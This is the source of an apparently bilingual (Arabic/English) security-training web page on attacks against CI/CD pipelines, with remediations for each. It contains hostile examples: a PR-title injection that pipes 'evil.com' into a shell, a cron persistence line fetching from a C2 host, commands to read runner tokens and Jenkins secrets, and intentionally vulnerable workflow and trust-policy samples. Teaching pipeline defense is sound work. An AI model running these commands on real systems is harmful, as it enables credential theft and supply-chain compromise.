"use client";
import { LessonShell, Section, Callout, Code, Terminal, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="cicd-attacks">
      <L
        ar={<>
          <Section title="لماذا CI/CD هدف ذهبي">
            <p>خط الـ CI/CD هو الجسر بين <b>الكود</b> و <b>الإنتاج</b>. يعمل عادةً بصلاحيات أعلى من أي مطوّر فردي: cloud admin, registry write, deploy keys. اختراقه يعطي <b>سيطرة على كل ما يبني الفريق</b> — و عادةً يُغفل في برامج التصلب.</p>
            <Analogy>المصنع لا يحرس نفسه عند خط التجميع — يحرس البوابة. CI/CD هي خط التجميع: من يضع شيئاً صغيراً عليه يصل إلى كل سيارة تخرج.</Analogy>
            <Callout kind="danger" title="لماذا خطر بشكل استثنائي">
              SolarWinds (2020) كان اختراق build server. CodeCov (2021), Circle CI (2023), GitHub Actions (متعدد). نموذج "shift left" نقل أيضاً <b>السطح الهجومي left</b>.
            </Callout>
          </Section>

          <Section title="نقاط الدخول الرئيسية">
            <TwoCol>
              <Card title="Pull Request poisoning" color="red">
                PR من خارجي يعدّل ملف workflow — أو يضيف dependency خبيثة — يُشغّل بصلاحيات الـ runner المتميّز قبل المراجعة.
              </Card>
              <Card title="Secrets في logs / artifacts" color="amber">
                <span className="eng">echo $TOKEN</span> أو <span className="eng">printenv</span> في job، ثم تنزيل الـ logs العلنية. أو حفظ artifact غير مقصود.
              </Card>
              <Card title="Self-hosted runners" color="red">
                Runner persistent، يصعب تنظيفه بين jobs. PR من fork يصل لجهاز فعلي و يستمر فيه.
              </Card>
              <Card title="OIDC misconfig" color="amber">
                ربط GitHub Actions بـ AWS/Azure عبر OIDC ثم وضع <span className="eng">sub: *</span> أو غياب فلتر الفرع → أي repo في الـ org يدّعي الهوية.
              </Card>
              <Card title="Branch protection bypass" color="red">
                Bot accounts تتجاوز review. أو حق <span className="eng">contents: write</span> يكتب على فرع محمي عبر API.
              </Card>
              <Card title="Dependency confusion" color="amber">
                نشر حزمة internal باسم مطابق على npm/pypi العلني → CI يسحب الخبيثة لأن resolver لا يفرّق.
              </Card>
            </TwoCol>
          </Section>

          <Section title="GitHub Actions — أكثر النقاط شيوعاً">
            <h3>1) pull_request_target — الفخ الكلاسيكي</h3>
            <Code lang="yaml">{`# خطير! يُشغّل بصلاحيات repo (secrets) لكن مع كود الـ PR
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}    # كود غير موثوق!
      - run: npm install && npm run build                   # ينفّذ scripts الخبيثة
        env:
          NPM_TOKEN: \${{ secrets.NPM_TOKEN }}              # السرّ مكشوف`}</Code>
            <p>الإصلاح: استخدم <span className="eng">pull_request</span> العادي (لا secrets على PRs خارجية)، أو افصل المهام: workflow غير ذو امتيازات يبني، و workflow آخر يستخدم secrets فقط بعد label يدوي.</p>

            <h3>2) Script injection عبر context</h3>
            <Code lang="yaml">{`- run: echo "Title: \${{ github.event.pull_request.title }}"
  # عنوان PR مثل: $(curl evil.com/x.sh | sh) — ينفّذ على الـ runner!`}</Code>
            <p>الإصلاح: مرّر القيم عبر <span className="eng">env</span>:</p>
            <Code lang="yaml">{`- run: echo "Title: $TITLE"
  env:
    TITLE: \${{ github.event.pull_request.title }}`}</Code>

            <h3>3) Third-party action مثبّتة بـ tag (mutable)</h3>
            <Code lang="yaml">{`- uses: tj-actions/changed-files@v44   # tag يمكن تحريكه!
# في 2025 تم اختراق tj-actions و أُعيد توجيه v44 لـ commit يسرّب secrets`}</Code>
            <p>الإصلاح: ثبّت بـ <b>SHA كامل</b>:</p>
            <Code lang="yaml">{`- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8   # v44.5.7`}</Code>
          </Section>

          <Section title="Self-hosted runners — أخطر منشأة">
            <Terminal lines={[
              { p: "# داخل runner مخترق — استمرارية:" },
              { p: "echo '* * * * * curl https://c2/x.sh | bash' >> ~/.cron" },
              { p: "" },
              { p: "# سرقة GITHUB_TOKEN لأي job يعمل بعدك" },
              { p: "cat /tmp/_runner_file_commands/* 2>/dev/null" },
              { p: "" },
              { p: "# سرقة OIDC token (يفتح AWS/Azure)" },
              { p: "echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN" },
              { p: "echo $ACTIONS_ID_TOKEN_REQUEST_URL" },
            ]} />
            <Callout kind="info" title="قاعدة">
              لا تشغّل self-hosted runners على مستودعات عامة <b>أبداً</b>. إذا اضطررت: استخدم <b>ephemeral runners</b> (VM جديد لكل job) و اعزلها على شبكة بدون وصول لـ prod.
            </Callout>
          </Section>

          <Section title="OIDC misconfiguration — اختراق سحابي بدون كلمة مرور">
            <Code lang="json">{`// AWS Trust policy خطر — أي workflow في الـ org يأخذ الدور!
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::1234:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:my-org/*"   // <— خطأ
    }
  }
}`}</Code>
            <p>الصحيح: قيّد بفرع محدّد و repo محدّد:</p>
            <Code lang="text">{`"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"`}</Code>
          </Section>

          <Section title="Jenkins — أعمار طويلة، مفاجآت أكثر">
            <ul>
              <li><b>Script Console</b> (<span className="eng">/script</span>) → تنفيذ Groovy = root على الـ master. كثير من Jenkins يكشف هذا.</li>
              <li><b>build with parameters</b> → injection في shell step.</li>
              <li><b>credentials.xml</b> على الـ master يحوي كل الأسرار مشفّرة بمفتاح موجود بجوارها.</li>
            </ul>
            <Terminal lines={[
              { p: "# اكتشاف Jenkins مكشوف" },
              { p: "shodan search 'http.title:\"Dashboard [Jenkins]\" http.html:\"sign up\"'" },
              { p: "" },
              { p: "# لو وصلت Script Console:" },
              { p: "# Manage Jenkins → Script Console:" },
              { p: "println \"id\".execute().text" },
              { p: "println new File('/var/lib/jenkins/secrets/master.key').text" },
            ]} />
          </Section>

          <Section title="Container registries و artifacts">
            <p>سرقة push token تعني نشر صورة خبيثة بنفس الاسم. كل من يسحب <span className="eng">latest</span> ينفّذها.</p>
            <Code lang="bash">{`# Docker Hub — push صورة مع entrypoint خبيث
docker build -t myorg/app:latest -f Dockerfile.evil .
docker push myorg/app:latest

# الدفاع: image signing
cosign sign --key cosign.key myorg/app:sha256@...
cosign verify --key cosign.pub myorg/app:latest    # في deploy step`}</Code>
          </Section>

          <Section title="SLSA و Sigstore — التوقيع المُعتمد">
            <p>SLSA (Supply-chain Levels for Software Artifacts) إطار من Google يحدّد مستويات نضج. الهدف: كل artifact يأتي مع <b>provenance</b> موقّعة تثبت من بناه و من أي مصدر.</p>
            <ul>
              <li><b>Sigstore / cosign</b> — توقيع keyless عبر OIDC (Fulcio CA + Rekor transparency log).</li>
              <li><b>SLSA Level 3</b>: build على hosted ephemeral runner، provenance غير قابلة للتزوير.</li>
              <li><b>Verification في admission</b>: Kubernetes + <span className="eng">Kyverno</span>/<span className="eng">Connaisseur</span> يرفض الـ pods بدون توقيع.</li>
            </ul>
          </Section>

          <Section title="الكشف و الدفاع">
            <Callout kind="good" title="ضوابط حاسمة">
              <ol>
                <li><b>Pin actions بـ SHA</b>، لا tags. أتمتة عبر Dependabot/Renovate.</li>
                <li>منع <span className="eng">pull_request_target</span> + checkout PR ref في نفس الـ workflow.</li>
                <li>OIDC: حدّد <span className="eng">sub</span> بدقة (repo + ref). لا wildcards.</li>
                <li>Secret scanning + push protection على المستودع.</li>
                <li>Branch protection: required reviews، signed commits، linear history.</li>
                <li>Ephemeral runners فقط للمستودعات العامة.</li>
                <li>Network egress من runners إلى allowlist معروف فقط.</li>
                <li>Audit logs للـ org → SIEM. راقب: secret scanning bypass، ربط OIDC جديد، ترقية صلاحيات.</li>
              </ol>
            </Callout>
            <Callout kind="info" title="MITRE ATT&CK">
              T1195.002 (Compromise Software Supply Chain) · T1078.004 (Cloud Accounts) · T1053.005 (Scheduled Task: Pipeline) · T1098 (Account Manipulation).
            </Callout>
          </Section>
        </>}
        en={<>
          <Section title="Why CI/CD is a goldmine">
            <p>The CI/CD pipeline is the bridge between <b>code</b> and <b>production</b>. It typically runs with higher privileges than any individual developer: cloud admin, registry write, deploy keys. Compromising it gives <b>control over everything the team ships</b> — and it's commonly skipped in hardening programs.</p>
            <Analogy>The factory doesn't guard itself at the assembly line — it guards the gate. CI/CD is the assembly line: anyone who plants something tiny on it reaches every car that rolls out.</Analogy>
            <Callout kind="danger" title="Why uniquely dangerous">
              SolarWinds (2020) was a build-server compromise. CodeCov (2021), Circle CI (2023), GitHub Actions (multiple). "Shift left" also shifted the <b>attack surface left</b>.
            </Callout>
          </Section>

          <Section title="Primary entry points">
            <TwoCol>
              <Card title="PR poisoning" color="red">
                A PR from a fork edits the workflow — or adds a malicious dependency — and runs with the privileged runner before review.
              </Card>
              <Card title="Secrets in logs / artifacts" color="amber">
                <span className="eng">echo $TOKEN</span> or <span className="eng">printenv</span> in a job, then anyone downloads the public log. Or an unintended artifact dump.
              </Card>
              <Card title="Self-hosted runners" color="red">
                Persistent runner, hard to clean between jobs. A fork PR lands on real metal and stays there.
              </Card>
              <Card title="OIDC misconfig" color="amber">
                GitHub Actions ↔ AWS/Azure via OIDC with <span className="eng">sub: *</span> or no branch filter → any repo in the org assumes the role.
              </Card>
              <Card title="Branch protection bypass" color="red">
                Bot accounts skip review. Or a token with <span className="eng">contents: write</span> writes to a protected branch via API.
              </Card>
              <Card title="Dependency confusion" color="amber">
                Publish a malicious package on public npm/pypi with the same name as an internal one → CI pulls it because the resolver can't tell.
              </Card>
            </TwoCol>
          </Section>

          <Section title="GitHub Actions — the most-hit surface">
            <h3>1) pull_request_target — the classic trap</h3>
            <Code lang="yaml">{`# Dangerous! Runs with repo secrets but with PR-controlled code
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}    # untrusted code!
      - run: npm install && npm run build                   # malicious scripts run
        env:
          NPM_TOKEN: \${{ secrets.NPM_TOKEN }}              # leaked`}</Code>
            <p>Fix: use plain <span className="eng">pull_request</span> (no secrets for forks), or split jobs: an unprivileged workflow builds, a separate privileged one runs only after a manual label.</p>

            <h3>2) Script injection via context</h3>
            <Code lang="yaml">{`- run: echo "Title: \${{ github.event.pull_request.title }}"
  # PR title like: $(curl evil.com/x.sh | sh) — executes on the runner!`}</Code>
            <p>Fix: pass through <span className="eng">env</span>:</p>
            <Code lang="yaml">{`- run: echo "Title: $TITLE"
  env:
    TITLE: \${{ github.event.pull_request.title }}`}</Code>

            <h3>3) Third-party action pinned by tag (mutable)</h3>
            <Code lang="yaml">{`- uses: tj-actions/changed-files@v44   # tag is movable!
# In 2025 tj-actions was compromised and v44 redirected to a secrets-stealing commit`}</Code>
            <p>Fix: pin by <b>full SHA</b>:</p>
            <Code lang="yaml">{`- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8   # v44.5.7`}</Code>
          </Section>

          <Section title="Self-hosted runners — the worst landmine">
            <Terminal lines={[
              { p: "# Inside a compromised runner — persistence:" },
              { p: "echo '* * * * * curl https://c2/x.sh | bash' >> ~/.cron" },
              { p: "" },
              { p: "# Steal GITHUB_TOKEN from any job that runs after you" },
              { p: "cat /tmp/_runner_file_commands/* 2>/dev/null" },
              { p: "" },
              { p: "# Steal OIDC token (opens AWS/Azure)" },
              { p: "echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN" },
              { p: "echo $ACTIONS_ID_TOKEN_REQUEST_URL" },
            ]} />
            <Callout kind="info" title="Rule">
              <b>Never</b> run self-hosted runners against public repos. If you must: use <b>ephemeral runners</b> (fresh VM per job) and isolate them on a network with no prod access.
            </Callout>
          </Section>

          <Section title="OIDC misconfiguration — passwordless cloud takeover">
            <Code lang="json">{`// Dangerous AWS trust policy — any workflow in the org can assume!
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::1234:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:my-org/*"   // <— wrong
    }
  }
}`}</Code>
            <p>Correct: scope by branch and repo:</p>
            <Code lang="text">{`"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"`}</Code>
          </Section>

          <Section title="Jenkins — long-lived, full of surprises">
            <ul>
              <li><b>Script Console</b> (<span className="eng">/script</span>) → Groovy execution = root on the master. Many Jenkins instances expose this.</li>
              <li><b>Build with parameters</b> → shell injection in build steps.</li>
              <li><b>credentials.xml</b> on the master holds every secret encrypted with a key sitting next to it.</li>
            </ul>
            <Terminal lines={[
              { p: "# Find exposed Jenkins" },
              { p: "shodan search 'http.title:\"Dashboard [Jenkins]\" http.html:\"sign up\"'" },
              { p: "" },
              { p: "# If you reach Script Console:" },
              { p: "# Manage Jenkins → Script Console:" },
              { p: "println \"id\".execute().text" },
              { p: "println new File('/var/lib/jenkins/secrets/master.key').text" },
            ]} />
          </Section>

          <Section title="Container registries & artifacts">
            <p>Stealing a push token means publishing a malicious image under the same name. Anyone pulling <span className="eng">latest</span> runs it.</p>
            <Code lang="bash">{`# Docker Hub — push image with malicious entrypoint
docker build -t myorg/app:latest -f Dockerfile.evil .
docker push myorg/app:latest

# Defense: image signing
cosign sign --key cosign.key myorg/app:sha256@...
cosign verify --key cosign.pub myorg/app:latest    # in deploy step`}</Code>
          </Section>

          <Section title="SLSA & Sigstore — verifiable provenance">
            <p>SLSA (Supply-chain Levels for Software Artifacts) is Google's maturity framework. Goal: every artifact ships with <b>signed provenance</b> proving who built it and from what source.</p>
            <ul>
              <li><b>Sigstore / cosign</b> — keyless signing via OIDC (Fulcio CA + Rekor transparency log).</li>
              <li><b>SLSA Level 3</b>: builds on hosted ephemeral runners, non-forgeable provenance.</li>
              <li><b>Admission verification</b>: Kubernetes + <span className="eng">Kyverno</span>/<span className="eng">Connaisseur</span> rejects unsigned pods.</li>
            </ul>
          </Section>

          <Section title="Detection & defense">
            <Callout kind="good" title="Critical controls">
              <ol>
                <li><b>Pin actions by SHA</b>, not tags. Automate via Dependabot/Renovate.</li>
                <li>Avoid <span className="eng">pull_request_target</span> + checkout of PR ref in the same workflow.</li>
                <li>OIDC: scope <span className="eng">sub</span> tightly (repo + ref). No wildcards.</li>
                <li>Secret scanning + push protection on every repo.</li>
                <li>Branch protection: required reviews, signed commits, linear history.</li>
                <li>Ephemeral runners only, especially for public repos.</li>
                <li>Network egress from runners → allowlist only.</li>
                <li>Org audit logs → SIEM. Watch: secret scanning bypass, new OIDC providers, role escalations.</li>
              </ol>
            </Callout>
            <Callout kind="info" title="MITRE ATT&CK">
              T1195.002 (Compromise Software Supply Chain) · T1078.004 (Cloud Accounts) · T1053.005 (Scheduled Task: Pipeline) · T1098 (Account Manipulation).
            </Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
